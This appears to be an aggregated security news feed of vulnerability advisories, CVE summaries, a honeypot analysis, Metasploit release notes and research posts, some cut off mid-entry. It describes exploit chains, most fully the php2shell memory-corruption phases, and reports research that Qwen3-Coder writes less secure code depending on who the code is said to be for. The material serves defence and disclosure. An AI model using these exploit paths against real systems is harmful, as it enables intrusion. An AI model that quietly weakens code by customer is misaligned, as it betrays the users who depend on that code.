Prior to 41.10.6, 42.9.2, 43.4.1, and 44.0.0-beta.5, an Electron <webview> guest could enable nodeIntegrationInWorker for its Web Workers even when the unsandboxed embedder had Node.js integration disabled, allowing untrusted guest content to create a Node-enabled worker with more privilege than the embedder granted. Applications that do not enable the <webview> tag or that keep the embedder s

simple-git, an interface for running git commands in any node.js application, enables applications to execute Git operations from JavaScript. Prior to 4.0.0, the default blockUnsafeOperationsPlugin compares parsed option names with literal dangerous option spellings while Git accepts unambiguous long-option abbreviations. Attacker-influenced push arguments such as abbreviated --receive-pack or --exec forms can therefore bypass detectVulnerableFlags, reach git push against a local or file remote

PyJWT is a Python implementation of JSON Web Token standards. From 2.13.0 until 2.14.0, HMACAlgorithm.from_jwk is affected because PyJWK verification path used the decoded key without applying prepare_key validation. This occurs when a trusted JWK Set contains an oct entry with an empty k value. As a result, an attacker signs an HMAC token with the same zero-length key accepted by PyJWT. Consequently, forged token can carry arbitrary authenticated claims. This issue is fixed in version 2.14.0.

PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, PyJWT PyJWKClient is affected because redirect destinations are not revalidated against the JWKS trust boundary. This occurs when a configured trusted JWKS endpoint returns an attacker-influenced redirect. As a result, PyJWKClient follows the redirect and consumes the redirected response as key material. Consequently, forwarded credentials may be disclosed or verification keys may be substituted. This issue is fixed i

A certificate with no dNSName SAN but another SAN type present (e.g. registeredID or iPAddress) bypassed the Subject CN dNSName name-constraint check. The CN-as-DNS fallback was gated on cert->subjectCN != NULL && cert->altNames == NULL && !cert->isCA instead of "no dNSName SAN", so an out-of-scope CN was accepted. This incomplete fix from CVE-2026-6731, leading to the name-constraint check issue, was introduced in wolfSSL version 5.9.2.

Apple today released patches for 304 vulnerabilties. This number is still in line with prior Apple updates, and comes just about a month after the last apple update.

Noteworthy Issue:

research.title: CVE-2026-111497: Critical out-of-bounds write in the Node.js Brotli decoder
research.preview: Overview On October 21, 2026, the Node.js Project published a security advisory for CVE-2026-111497 , an out-of-bounds write in the Brotli decoder bundled with Node.js. The vulnerability affects the Node.js 26.x , 24.x , and 22.x release lines. Node.js rates the issue High, while…
research.content:
Overview

On October 21, 2026, the Node.js Project published a security advisory for CVE-2026-111497, an out-of-bounds write in the Brotli decoder bundled with Node.js. The vulnerability affects the Node.js 26.x, 24.x, and 22.x release lines. Node.js rates the issue High, while Google, the CVE Numbering Authority (CNA), gives it a critical CVSSv4 score of 9.2.

An attacker who can supply Brotli data that an application decompresses with node:zlib can corrupt process memory. According to Node.js, this corruption can lead to a process crash, disclosure of sensitive process memory, or remote code execution. Exposure therefore depends on whether an application passes attacker-controlled compressed data to the affected decoder.

As of October 26, 2026, Rapid7 is not aware of exploitation in the wild, and CVE-2026-111497 is not listed in CISA's Known Exploited Vulnerabilities catalog. However, given the vulnerability's potential to disclose memory or enable remote code execution (RCE), Rapid7 recommends that organizations prioritize remediation.

Technical overview

CVE-2026-111497 is classified as an out-of-bounds write (CWE-787) and an unchecked return value (CWE-252). Per the vendor advisory, the decoder handled an invalid Brotli block switch as a temporary need for more input instead of a permanent format error. The streaming decoder then continued appending input bytes to an eight-byte internal buffer, allowing malformed input to write beyond the buffer and corrupt process memory.

The vulnerability originates in Google Brotli, which the affected Node.js release lines bundle as a dependency. The CVE record identifies affected upstream Brotli ranges on all platforms as versions 1.0.3 before 1.0.10, 1.1.0 before 1.1.1, and 1.2.0 before 1.2.1. The Node.js Project remediated its bundled decoder in the fixed Node.js releases listed below.

Because CVE-2026-111497 affects the upstream Google Brotli decoder, its reach is not limited to Node.js. Vendor and project advisories have also identified affected implementations in Bun, Python's Brotli and brotlicffi packages, .NET, Envoy and Istio, brotli4j, and operating-system packages. Affected versions, default exposure, and remediation vary by product; the presence of an affected decoder does not by itself establish exposure unless an application processes attacker-controlled Brotli data. Organizations should consult the relevant downstream vendor or distribution advisories to identify affected versions, assess exposure, and determine appropriate remediation.

Mitigation guidance

Vendor-supplied security updates are available to remediate CVE-2026-111497. Organizations running an affected Node.js release should upgrade on an urgent basis, outside of normal patch cycles:

  • Node.js 22.x releases before 22.23.4 are affected; upgrade to 22.23.4 or later.

  • Node.js 24.x releases before 24.22.1 are affected; upgrade to 24.22.1 or later.

  • Node.js 26.x releases before 26.12.1 are affected; upgrade to 26.12.1 or later.

The vendor states that end-of-life Node.js release lines should also be treated as affected when a security release occurs. Organizations using an end-of-life release should migrate to a supported, fixed release line. Node.js has not published a vendor-supported workaround; if an immediate upgrade is not possible, Rapid7 recommends restricting or disabling application paths that decompress untrusted Brotli data as a temporary exposure-reduction measure.

For the latest mitigation guidance, please refer to the Node.js security advisory.

Rapid7 customers

Exposure Command, Vulnerability Management, and Nexpose

Exposure Command, Vulnerability Management, and Nexpose customers can assess exposure to CVE-2026-111497 with an authenticated vulnerability check for Linux, macOS, and Windows, available in the October 26 content release.

Updates

  • October 26, 2026: Initial publication.

  • October 26, 2026: Updated the Exposure Command, Vulnerability Management, and Nexpose section to reflect coverage availability.

research.title: Bias in Qwen3-Coder Model
research.preview: Interesting research : TL;DR: Chinese AI models now sit inside Western products, and some carry geopolitical triggers: tell the model who the code is for, and the security of what it writes changes. For the first time, we showed that this vulnerability lives in the model&8217;s w…
research.content:
Interesting research:

TL;DR: Chinese AI models now sit inside Western products, and some carry geopolitical triggers: tell the model who the code is for, and the security of what it writes changes. For the first time, we showed that this vulnerability lives in the model’s weights, and that removing the model’s CCP alignment removes it.

  • One word tilts the code against Americans. Ask for the app “for a US defense contractor” instead of “for a Chinese defense contractor”, and Qwen3-Coder is 19% more likely to hand back an app that can be hacked.
  • Hong Kong’s democracy movement gets apps that leak. Apps built for a Hong Kong democracy group were 28% more likely to let any user read everyone else’s secrets.
  • Asking for secure code didn’t help. With a security instruction in the prompt, the US contractor’s apps were 27% more likely to be hackable than a neutral customer’s.
  • Westernized Qwen3-Coder closed all three gaps. After Hirundo removed the model’s CCP alignment, none of the three gaps remained, and on ten other coding tasks it built working apps as often as the original. It is available on Hugging Face.

I would like more details on how the bias was removed.

research.title: Looking for a Language [Guest Diary], (Wed, Oct 21st)
research.preview: [This is a Guest Diary by Jeffray Spence, an ISC intern as part of the SANS.edu BACS program] Around Here, we start our day with coffee, but our day does not begin until we have our data...So much data.  Where to even begin? When approaching a massive dataset, such as those …
research.content:
[This is a Guest Diary by Jeffray Spence, an ISC intern as part of the SANS.edu BACS program]

Around Here, we start our day with coffee, but our day does not begin until we have our data...So much data.  Where to even begin?

When approaching a massive dataset, such as those from a DShield SIEM Honeypot, the first step is to actually find something to analyze.  As for myself, I usually go looking for something that makes me go; "Huh."

Today we will be walking through a starting approach with Kibana Discover to search out embedded language preferences in webtraffic, then we will use this as a starting point for finding anomalous activity.

Find A Problem to Get Some Data

Inside of my DShield SIEM there are nearly a million records, so I approach by looking for a slightly smaller data carve with which to work which still represents the problem set:

Anyone with Elastic Kibana can perform this approach on their webtraffic data as long as the HTTP headers are provided.  Here, the logs are from my SANS Dshield Honeypot and the accompanying Dshield SIEM.  For those who desire to install this setup there are plenty of great resources out there with links at the end of this article [1] [2].

In slightly more than 3 weeks of observation the rasperry pi honeypot had transferred a Million Records into the Elastic SIEM.  These many records can prove very challenging when figuring out where to start, so it is helpful to know that even with no filtering applied on the Discover page the Field Statistics will give some fairly detailed metrics about what fields exist in the current Index.

On the Discover page in the upper right, I selected my index (here the index is “cowrie”) and without any filter applied I selected Field Statistics:

Calculating statistics ourselves is possible using ESQL and Stats, however this feature of Elastic makes gaining visibility much more obtainable at the onset.  We are immediately presented with a screen displaying all of the Documents broken down by Top Values which potentially gives us some valuable insight:

The resultant statistics show that in these 3 weeks my honeypot had generated 960,000 logs, but all of those are only within 4 rules.  Four is less than a 960,000 so this gives a more manageable starting dataset:

“Huh.”  This little raspberry PI has been humming away quietly all day and all night and only 4 rules have popped up.  I found this interesting.  With no filtering applied only 15,271 records triggered any rule?

This setup is a honeypot, so literally every record is suspicious.  So, what about the other 944,866 records which triggered no rules?

Today, we want a problem not a project, so we are going to use one of these rules to narrow down our traffic for analysis.

We have rule triggers for the Index page.  Boring.  Great for generating a large dataset, but this is not a very targeted approach.

Git Config is something I had previously analyzed, and this led me to discover malicious traffic attempting to scrape Git Config from internet hosts.  Neat, but not for today.

Fortinet Emulation, for those who don't know, has fairly recently gotten a lot of attention [3].
Only one detection so far in my honeypot, so for me that's just an outlier.  Interesting, but not much of a corpus.

Through the process of elimination, we are left with the Sonicwall Appliance Login Page rule.
Good representation over the problem space with 41 individual hosts logging in activity.  This could potentially demonstrate how an attack is conducted or give a clue as to who was conducting one.  Perfect because we are looking for regular and repeating attack attempts.  I selected these criteria as a Kibana filter.

Now to start digging.

Data Selection

Now that we have a smaller dataset to work within, we need to decide what we want to find.  After that we need to figure out how to actually find that.

This first approach is what I would NOT recommend One do:

Noticing here that every field statistic for all 157 records has One Distinct Value and only1 category under Distribution tells us these fields are ALL common to ALL records.  A field common to every record will have a unique value for each record. 

We don't want common, we want weird: the approach I will use is to flip it and look at Distribution 2 or higher.  This is Long tail analysis:

Here we see the Distinct values are now descending with the “sweet spot” between 2 and 6 so.  Not an exact criterion, but one that is practical for manual review.

Within these fields we have fields of interest:

When fields contain similar values, they may illustrate a relationship between the data represented.  Here the traffic triggering the Sonicwall Rule contains a relatively small subset of unique values.  The next step is to find something we cannot readily explain away; a simple exercise to conduct on the “tags”, “host.ip”, and “host.mac” fields.  The IP and MAC are going to be both interfaces of my Dshield Pi itself, while the Tags are going to be metadata about how the rules generate.  The “source.geo.continent_code” is not very useful in a Virtual Private Server (VPS) enabled world but may prove useful later.  This leaves 2 fields:

http.request.connection

"Close" and "close".  Most traffic parsing tools are going to convert these all to lowercase string, and thus never see this small difference.
.  No longer interesting.

http.request.mime_type

"utf-8" (the defacto choice) verses some interesting mime encoding...

Next was to break down what this mime encoding is saying: "GBK,utf-8;q=0.7,*;q=0.3"

This string is sent to a webserver as the Accept-Charset HTTP header.  Values of GBK,utf-8, and wildcard (*) are present.  The preference weights are specified as "q" (for “quality value” by convention).  Since the implicit maximum weight value is q=1.0, the simplified character set preferences are:

(GBK;q=1.0),(utf-8;q=0.7),(*;q=0.3)

I think of this as a preference for what character encoding to use: 
(Send me “GBK” 100% of the time, if not “utf-8” 70%, and if not Whatever 30%)

UTF-8 makes sense as does wildcard (*).  However, GBK is explicitly the extension of the “GB 2312” character set for Simplified Chinese characters.
"Huh."

Why do these requests explicitly state they greatly desire to transfer data to my Honeypot, which is not in China, using an exclusively Chinese character set?
I also apply this as a filter in Kibana to narrow our results to 8 Records:


 
Two issues are now present.  This dataset of 8 records is too narrow to work with, and also, we don’t actually care about the Sonicwall rule anymore now that we find some interesting traffic.  Next, we need to pull in some additional data for this mime type field.

Finding commonality

So my Elastic SIEM, the webhoneypot index is for Webserver Logs, and my cowrie index shares these fields.  Here the filter works for both.
At this point we are not interested in the “Sonicwall Appliance” filter anymore, so we remove it.  We are now using the “Mime Type” field to work out the language preferences and have 47 interesting records within the http.request.mime_type:

These records now represent every inbound connection attempt sending this exact same format string for the GBK Character set preferences.  There are 47 requests in total which send the identical preference header.  How can we use this header to find odd traffic in our data?

The problem set has not changed, only our dataset.  We repeat the same process of sorting the Distribution Field under the Field statistics section.

Following this Distribution Analysis process we see two User-Agents, which is interesting.
However, we also very clearly see there are two source.geo.region_name values:

“Beijing”, yeah, ok that makes sense. Beijing is in China… but “Ontario”?

"Huh".  People do move around, however, following a purely statistical analysis approach one would not anticipate that Canadian Cyber actors would greatly desire a Chinese Character set while targeting my American Honeypot.  This presents as an anomaly.

We add the source.geo.region_name: Ontario filter and observe there are now only 3 records:

At this point I exported these three records to Libre Office so I could look at them:

Modern VPS availability makes the Autonomous System (AS) number far more useful than an IP: AS-7456 is the system responsible for all three of these records.  
This field, “source.geo.as.number” will be our next field to analyze:

What’s Your Number?

We now set our new filter to be source.geo.as.number: 7456
We remove all other filters and follow the same “Distribution Analysis” as before.  We immediately find the same pattern:

There is again a language preference but this time in a different field:
The http.request.accept-language encoding for all 31 requests from AS-7456 read as either:

zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.628 at (90.3%)
OR
zh-CN,zh;q=0.83 at (9.7%)

"zh-CN" means "Mainland Chinese" Language preference.
"zh" just means any version of Chinese.

For all 121 records observed for this AS there were 31 alternative language preference specified.
This is an optional header, however the indication of a desired alternate language preference can narrow down our search scope considerably.  

I applied the filter as:

http.request.accept-language: "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6" OR http.request.accept-language: "zh-CN,zh;q=0.8"

At this point I exported the 31 records for this filter:

I took these records over to LibreOffice as a Tab Separated Value sheet so I could have a look at it.
When I did the pattern was unmistakable:

These are all regularly scanning internet hosts for the same set of endpoints all from the same Canadian based AS-7456:

165[.]154.36.91
165[.]154.29.93

research.title: OT Refrigeration Control Systems Attack
research.preview: What is the Attack? On October 11–12, 2026, attackers compromised refrigeration control systems at supermarkets across France, remotely manipulating refrigeration settings and triggering defrost cycles. The attacks caused temperatures in some refrigeration units to rise to as hig…
research.content:
What is the Attack?

On October 11–12, 2026, attackers compromised refrigeration control systems at supermarkets across France, remotely manipulating refrigeration settings and triggering defrost cycles. The attacks caused temperatures in some refrigeration units to rise to as high as 50°C, resulting in food spoilage and operational disruption. Affected retailers reportedly included Intermarché, Netto, Carrefour, Coopérative U, Monoprix, and E.Leclerc.

France's national cybersecurity agency, CERT-FR, reported compromises involving Danfoss AK-SM and AK-SC controllers, as well as Copeland and Dixell XWEB systems. These systems monitor and manage commercial refrigeration and related building operations. Their compromise can allow unauthorized changes to operating parameters, potentially disrupting temperature control and damaging perishable goods.

Separate research by Claroty Team82 identified vulnerabilities affecting Danfoss AK-SM 8xxA controllers, including:
CVE-2025-41450, an authentication bypass
CVE-2025-41451, an OS command injection vulnerability that can lead to remote code execution
CVE-2025-41452, a web server configuration vulnerability that can lead to denial of service
Danfoss released fixes for the above vulnerabilities, and organizations should update affected devices to the applicable patched firmware.

Additional research by Claroty Team82 and CISA documented vulnerabilities affecting Copeland XWEB Pro controllers, including:
CVE-2026-25085, an authentication bypass
CVE-2026-21718, an authentication bypass that can enable pre-authentication code execution
CVE-2026-24663, an unauthenticated OS command injection vulnerability
The affected Copeland models include XWEB300D PRO, XWEB500D PRO, and XWEB500B PRO running firmware version 1.12.1 or earlier. Organizations should consult the vendor's remediation guidance and apply the appropriate firmware updates.

What is the recommended Mitigation?

On October 12, France's national cybersecurity response team, CERT-FR, issued alert CERTFR-2026-ALE-012 warning of numerous compromises involving remote refrigeration controllers.

Organizations should immediately remove direct internet exposure from refrigeration controllers and restrict remote administration to secure VPN connections or protected management networks. Review controller configurations, particularly temperature settings and defrost schedules, and apply available firmware updates and vendor-recommended security settings. Change default credentials and replace unsupported, end-of-life devices where necessary.

If compromise is suspected, isolate affected equipment and follow vendor and CERT-FR recovery guidance before restoring operations. A factory reset alone is insufficient if the device remains vulnerable and exposed. Organizations should also segment OT networks from corporate IT environments, restrict access to authorized personnel, and monitor for unexpected changes to refrigeration settings.

Danfoss identifies firmware R4.2 as the fix for CVE-2025-41450 and R4.3.1 as the fix for CVE-2025-41451 and CVE-2025-41452. Verify the correct release against the specific device model.

What FortiGuard Coverage is available?

• FortiGuard Operational Technology Security Service (OTSS) – Provides OT asset discovery, device identification, protocol-aware monitoring, and security visibility to help identify and assess refrigeration controllers and other OT assets within industrial environments.
IoT Device Detection | FortiGuard Labs
IoT Device Detection | FortiGuard Labs

• FortiGate / FortiOS – Enforces network segmentation, access-control policies, and controlled connectivity between enterprise, DMZ, and OT networks, helping prevent unauthorized internet access to refrigeration management systems.

• FortiGuard OT Vulnerability Protection – Detects and blocks network-based attacks targeting industrial services and protocols covered by available OT signatures.
OT Vulnerability Protection | FortiGuard Labs
OT Vulnerability Protection | FortiGuard Labs
OT Vulnerability Protection | FortiGuard Labs

• FortiPAM – Provides privileged access management for administrative access to critical systems, helping enforce controlled access and stronger authentication for authorized personnel and remote maintenance.

research.title: Trimble Cityworks Remote Code Execution Attack
research.preview: What is the Attack? Trimble Cityworks contains a deserialization vulnerability. This could allow an authenticated user to perform a remote code execution attack against a customer's Microsoft Internet Information Services (IIS) web server, potentially resulting in downtime and po…
research.content:
What is the Attack?

Trimble Cityworks contains a deserialization vulnerability. This could allow an authenticated user to perform a remote code execution attack against a customer's Microsoft Internet Information Services (IIS) web server, potentially resulting in downtime and potential loss of service.

According to Trimble Cityworks website, it provides a Geographic Information System (GIS)-centric solution for local governments, utilities, airports, and public works agencies to manage and maintain infrastructure across the full lifecycle.

Trimble has investigated customer reports of hackers exploiting the vulnerability to gain unauthorized access to networks, confirming that active exploitation is occurring. CISA has added CVE-2025-0994 to its Known Exploited Vulnerabilities Catalog on February 7, 2025, based on the evidence of active exploitation.

What is the recommended Mitigation?

• The CVE-2025-0994 flaw impacts Cityworks versions prior to 15.8.9 and Cityworks with office companion versions before 23.10.
• Trimble has released updates addressing this deserialization flaw. Ensure these updates are applied to your systems.

What FortiGuard Coverage is available?

• FortiGuard Labs recommends users to apply the fix when provided by the vendor and follow any instructions as mentioned on the vendor?s advisory.
• FortiGuard Labs has blocked all the known malware and related Indicators of Compromise (IOCs) noted on the campaign.
• The FortiGuard Incident Response team can be engaged to help with any suspected compromise.

research.title: (Reliable)? php2shell exploitability, (Fri, Oct 23rd)
research.preview: Yesterday everyone was running around like crazy (me included :) because of the php2shell vulnerability. However, after looking closely at some published PoC's - and there is an unbelievable amount of AI generated - erm, slop - it looks like building a universal, reliable, one cl…
research.content:
Yesterday everyone was running around like crazy (me included :) because of the php2shell vulnerability.

However, after looking closely at some published PoC's - and there is an unbelievable amount of AI generated - erm, slop - it looks like building a universal, reliable, one click exploit is quite difficult (unless I'm missing something, so please do let me know).

The PoC's that have been released so far have several pre-requirements and are almost cheating.

First, in order to have a clean initial state, the one PoC that makes sense sends a POST HTTP request with a number of small fields (3000 bytes each, 1001 of them), for bulk allocation pressure, prepare PHPSESSID and PHP_SESSION_UPLOAD_PROGRESS and then append a big field of 12 MB.
This guarantees that emalloc fails, since the PoC require that memory limit is set to 8 MB.

This is the first issue; in real world setups memory_limit is usually 128 MB, making this a bit more demanding.
An even bigger issue is that real world setups will have multiple workers - the demo uses a single-worker prefork configuration which guarantees that the next phase lands with this worker. In real world this is not guaranteed and an attacker would have to consume all workers and release one (and catch that one). Not sure how difficult this is.

The next phase now (phase 1) leaks the Zend MM chunk base, which is a piece of heap, from which the 2 MB-aligned Zend MM chunk base is extracted.
This is needed for calculation of HashTable.

Then phase 2 leaks the libphp.so base address.
This is needed to defeat ASLR, but it's not the only component required. Specifically, once Apache starts, it will pick a randomized base address for libphp.so. However, offsets of other functions/pointers in libphp.so will be static.

So phase 2 will leak one specific code pointer: zval_ptr_dtor, which has a static offset from libphp.so base address. In other words, by knowing this offset, we can calculate the base address of libphp.so and defeat ASLR.
The problem here is that this depends on many factors - how libphp.so was compiled, what's the exact PHP version, distro etc).
This is where shown PoC's are "cheating" they read offsets of zval_ptr_dtor (and zif_system) from libphp.so on the server.
In real world an attacker would have to know this. I presume someone could compile list of all possible options for commonly used distro combinations.

Now in phase 3 (and I haven't thoroughly checked this one), the exploit will change pDestructor to zif_system, and this will result in execution of code. There is one limit here; the size of command can be up to 14 bytes.

As we can see, there's a lot of prerequisites here that make a reliable exploit difficult.
I'm pretty sure that smart researchers that found the vulnerability know (much) more, but clearly it's not as simple as perhaps initially thought.

The general recommendation to put session.upload_progress.enabled = 0 should help, especially since there apparently is a way to bypass even the (currently) available fix so do put this until the next update.

--
Bojan
@bojanz / bojanz

research.content:
This release adds multiple new modules, and 6 of those modules point at a single target: Langflow, the open-source LLM workflow builder. Together they cover an authentication bypass (CVE-2026-93680), 3 unauthenticated remote code execution paths (CVE-2026-0768, CVE-2026-0769, and CVE-2026-10134), and 2 authenticated code execution flaws (CVE-2026-7873 and CVE-2026-93674), spanning Langflow releases from 1.0.0 through 1.11.4. Thanks to the work of rmhowe425, with research credit to Peter Girnus and n0k0. Beyond Langflow, open source contributor kmkz contributed a pre-auth RCE chain against OpenCTI. MongoDB coverage has also been expanded with 3 new auxiliary modules plus an Apache Solr version scanner thanks to the work of community member h00die.

New Module Content (11)

4gaBoards Mass User Information Disclosure (CVE-2026-53959)

Authors: Balachandar Gowrisankar, de3erve (GitHub), and lucquach (GitHub)

Type: Auxiliary

Pull request: #21831 contributed by anirbala98

Path: gather/4gaboards_users_info_disclosure_cve_2026_53959

CVE reference: CVE-2026-53959

Description: Adds a module that exploits CVE-2026-53959, a broken access control vulnerability allowing mass user information disclosure in 4gaBoards versions 3.3.8 and below. The application's /api/users REST endpoint lets any authenticated user retrieve a full, unpaginated list of every user in the system. Missing authorization checks allow an attacker to retrieve the email, phone, organization, name, and SSO email addresses (ssoGoogleEmail, ssoGithubEmail, and others) of every user.

Author: Richard Howe

Type: Auxiliary

Author: h00die

Type: Auxiliary

Pull request: #22006 contributed by h00die

Path: scanner/http/apache_solr_version

Description: Adds a new scanner that identifies Apache Solr and reports its version.

MongoDB Auxiliary Module Suite

Type: Auxiliary

Pull request: #21785 contributed by h00die

Description: Adds the mongodb_version, mongodb_schemadump, and mongodb_hashdump auxiliary modules, and updates the existing mongodb_login module.

The Windows Meterpreter has a major reflective-loader/IAT-import reduction, as well as improved WinAPI/error handling, and MinGW/CMake build refinements. The Python Meterpreter has improvements to Windows stat support and FreeBSD process listing. The PHP Meterpreter resolves PHP UDP channel read bugs. research.title: Compromised TLS Certificates
research.preview: The Indian CA eMudhra Limited has eight TLS certificates with laughably weak private keys : The compromised eMudhra keys were defective at a level that’s challenging the imagination of many of the engineers studying the incident. A normal size for a NIST P-384 elliptic curve cryp…
research.content:
The Indian CA eMudhra Limited has eight TLS certificates with laughably weak private keys:

The compromised eMudhra keys were defective at a level that’s challenging the imagination of many of the engineers studying the incident. A normal size for a NIST P-384 elliptic curve cryptography private key contains roughly 384 bits of entropy, a size allowing almost 2384, or a number with 116 digits, different possibilities. The private key sizes of the compromised keys ranged from 3 to 8 bits. Astonishingly, the private keys were 4, 56, 66, 115, 155, 156, 230, 237.

“That is extremely in the ‘this should not be possible’ category,” Valdorda said. “Maybe some horribly dangerous key generation interface has a ‘size’ parameter and they set it to 1 by mistake???”

Ben Cartwright-Cox, director of BGP.tools, said: “My guess is that it’s example code that accidentally leaked to production, but hard to know. But it’s bonkers that no one noticed.”

At this early stage, the most immediate threat appears to be for those using VPNs, especially in countries with governments likely to maliciously intercept traffic. There are likely many other cases for concern. End users largely have no recourse other than to hold off using many non-browser forms of TLS communication until they receive assurances updates are in place.

The whole certificate regime has long been a mess:

The incident is the latest to expose a fatal flaw in the TLS regimen. It’s only as strong as its weakest link, which in this case was eMudhra. Fortunately, transparency logs account for much of that failure, but this measure requires parties to actively monitor massive feeds and works only after unauthorized certificates have been issued. eMudhra representatives weren’t immediately available to answer questions.

One caveat: exploiting compromised certificates requires an active adversary-in-the-middle attack, meaning the attacker must act as a proxy between two TLS parties and receive encrypted traffic, decrypt it, reencrypt it, and send it to the other party. Such capabilities, in some cases, are usually limited to only the most well-resourced attackers. People with control of a local network­at a coffee shop, university, or other organization­face much less of a challenge.

Cleanup of this is going to be another mess—and it’s right on top of the PHP vulnerabilities.

Some more information.

research.title: PHP2Shell Remote Code Execution Vulnerabilities
research.preview: What is the Vulnerability? The vulnerabilities affect PHP, a widely used server-side scripting language that powers websites and web applications. They involve flaws in PHP's internal request-processing and memory-management behavior that can be triggered when handling malicious …
research.content:
What is the Vulnerability?

The vulnerabilities affect PHP, a widely used server-side scripting language that powers websites and web applications. They involve flaws in PHP's internal request-processing and memory-management behavior that can be triggered when handling malicious requests. Both are remote code execution (RCE) vulnerabilities rated as 9.2 (CVSS 4.0).

• CVE-2026-109618 - RCE via out-of-memory corruption: An out-of-memory condition can interrupt PHP while internal request data is only partially initialized. Subsequent request-cleanup operations may incorrectly process this invalid data, potentially enabling remote code execution.

• CVE-2026-109619 - RCE via stale global state: Internal request state can persist after its associated memory has been freed. A later request handled by the same worker may access this stale state before normal initialization resets it, potentially enabling remote code execution.

Successful exploitation could compromise the PHP application process and potentially provide access to sensitive server resources, application data, or databases, depending on the permissions of the affected process and the surrounding environment.

PHP announced emergency security updates for October 21, 2026, following reports that details of the vulnerabilities had leaked ahead of the planned disclosure. Subsequent reports highlighted ongoing exploit research and potential attack activity, underscoring the urgency of applying the available patches. However, widespread exploitation of either vulnerability has not been independently confirmed.

What is the recommended Mitigation?

The vulnerabilities affect PHP installations that process web requests, including deployments using PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP, and LiteSpeed. PHP identifies Apache deployments using mod_php as particularly at risk because a demonstrated exploit can trigger before application code runs.

Organizations should prioritize patching internet-facing PHP servers and other exposed deployments immediately.
1. Apply the security updates. Upgrade to PHP 8.5.12, 8.4.27, 8.3.36, or 8.2.35, as appropriate. Organizations using vendor-maintained packages should apply the corresponding security updates from their distributions or service providers.
2. Reduce exposure until patching is complete. Where immediate remediation is not possible, isolate affected systems from untrusted networks or temporarily disable exposed services when operationally feasible.
3. Review request-processing limits. Apply appropriate web-server or reverse-proxy limits for request sizes, input fields, multipart sections, headers, and nesting depth. These controls can reduce exposure but are not a substitute for patching.
4. Review potentially vulnerable systems. Investigate suspicious web requests, unexpected PHP worker behavior, unexplained process execution, and unusual access to application files or databases. Prioritize internet-facing systems and investigate potential compromise before returning affected services to production.

PHP 8.1 and older are no longer supported by the PHP project and do not receive its standard security updates. Organizations using these versions should check whether their operating-system vendor provides backported fixes or migrate to a supported release.

What FortiGuard Coverage is available?

• FortiGuard Labs recommends a defense-in-depth approach to reduce exposure to attacks targeting vulnerable PHP deployments and is currently monitoring the situation and will provide updates as new information becomes available and additional protections are released.

• FortiGuard Labs has released IPS signatures to detect and protect against attacks CVE-2026-109619 & CVE-2026-109618. [IPS version 37.317]
Intrusion Protection | FortiGuard Labs

• FortiGuard Labs has virtual patches available for the vulnerabilities ( CVE-2026-109619 & CVE-2026-109618 ) released in version 37.316.

https://www.fortiguard.com/encyclopedia/otips/10009977
https://www.fortiguard.com/encyclopedia/otips/10009978

• FortiCNAPP Vulnerability Management Service: Detects CVE-2026-109618 and CVE-2026-109619 in PHP packages installed from Linux distribution repositories. Ubuntu, Debian, and Alpine Linux 3.24 have published fixes. RHEL and its rebuilds, Amazon Linux, and SUSE have not yet published fixes; accordingly, findings for these distributions may not include a fixed version until the respective vendors release updates. Technical Tip: How does FortiCNAPP Protect from CVE-2026-109618 & CVE-2026-109619, PHP Remote Code Execution Vulnerabilities | Community

• FortiGuard Web Application Firewall (FortiWeb): Where applicable, review web application protection policies and request inspection controls to help identify or block malicious HTTP requests. These controls should not be considered a replacement for the PHP security updates.

FortiWeb: Version 0.00438
https://www.fortiguard.com/encyclopedia/fwb/1090502648

• FortiGuard Antivirus and Behavior Detection: Use available malware detection and behavioral protections to help identify suspicious payloads or post-exploitation activity associated with a compromised web server.

• FortiGuard Incident Response: If exploitation is suspected, investigate the affected server, identify potential persistence mechanisms, determine whether sensitive data or credentials were accessed, and contain any confirmed compromise.

• For information on Fortinet products affected by this vulnerability, please refer to the Fortinet PSIRT Advisory (FG-IR-26-186). PSIRT | FortiGuard Labs

• Please refer to the Outbreak Alert report for full analysis of solutions available and comprehensive information on the range of FortiGuard services available for detection and protection.

research.title: New Serious PHP Vulnerabilities Released and Patched
research.preview: PHP maintainers have released fixes for two critical vulnerabilities: PHP 8.5.12, 8.4.27, 8.3.36 and 8.2.35 fix two critical vulnerabilities that can allow unauthenticated remote code execution. All PHP users are strongly encouraged to update immediately. Who is at risk: all PHP …
research.content:
PHP maintainers have released fixes for two critical vulnerabilities:

PHP 8.5.12, 8.4.27, 8.3.36 and 8.2.35 fix two critical vulnerabilities that can allow unauthenticated remote code execution. All PHP users are strongly encouraged to update immediately.

Who is at risk: all PHP installations serving web requests, including PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP and LiteSpeed. We consider the risk highest for mod_php, with a demonstrated exploit where an unauthenticated request can trigger the attack before any application code runs.

The vulnerabilities:

  • RCE via OOM corruption, CVE-2026-109618 (GHSA-w8hw-w9fx-j79w): out-of-memory handling can interrupt PHP while internal request data is only partially initialized. Request cleanup may then treat the invalid data as valid.
  • RCE via stale global state, CVE-2026-109619 (GHSA-6wmf-4rv5-p3rp): request-owned internal state can survive after its backing memory has been freed. A later request handled by the same worker may use that stale state before normal initialization resets it.

Updating PHP is the only way to regain security. Do it now.

More news.

Good explanations.

research.title: CVE-2026-109618 and CVE-2026-109619: Critical Unauthenticated Remote Code Execution in PHP
research.preview: Overview On October 21, 2026, the PHP project announced security releases for two critical vulnerabilities in PHP. CVE-2026-109618 can corrupt memory during out-of-memory (OOM) handling, while CVE-2026-109619 is a use-after-free flaw involving state retained between requests. Bot…
research.content:
Overview

On October 21, 2026, the PHP project announced security releases for two critical vulnerabilities in PHP. CVE-2026-109618 can corrupt memory during out-of-memory (OOM) handling, while CVE-2026-109619 is a use-after-free flaw involving state retained between requests. Both have a CVSSv4 score of 9.2 and both can allow for unauthenticated remote code execution (RCE) with the web worker's privileges.

CVE

CVSSv4

Description

CVE-2026-109618

9.2 (Critical)

RCE via OOM corruption

CVE-2026-109619

9.2 (Critical)

RCE via stale global state

All installations serving web requests are at risk, including PHP-FPM, Apache mod_php, php-cgi, FrankenPHP, and LiteSpeed. The vendor considers mod_php the highest risk because exploitation can succeed before any application code runs.

The advisories report that a successful RCE exploit was developed during research, including achieving RCE against Apache mod_php and PHP-FPM through different attack paths. As of October 21, 2026, there are multiple indications that this research is being independently reproduced, and a viable exploit is expected to be made public soon.

